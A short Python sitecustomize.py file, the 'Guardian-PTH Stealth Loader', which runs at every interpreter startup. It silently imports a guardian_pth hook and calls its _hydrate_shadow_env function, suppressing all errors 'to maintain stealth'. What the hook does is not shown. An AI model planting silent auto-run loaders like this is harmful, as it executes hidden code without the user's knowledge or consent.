import os
import sys

# sitecustomize.py - Guardian-PTH Stealth Loader
# This file is loaded by the Python interpreter on startup.

try:
    # Use standard library only here for robustness
    import importlib.util
    
    # Try to find and load the hook logic
    spec = importlib.util.find_spec("guardian_pth")
    if spec:
        from guardian_pth import hook
        hook._hydrate_shadow_env()
except Exception:
    # Silent fail to maintain stealth and system stability
    pass
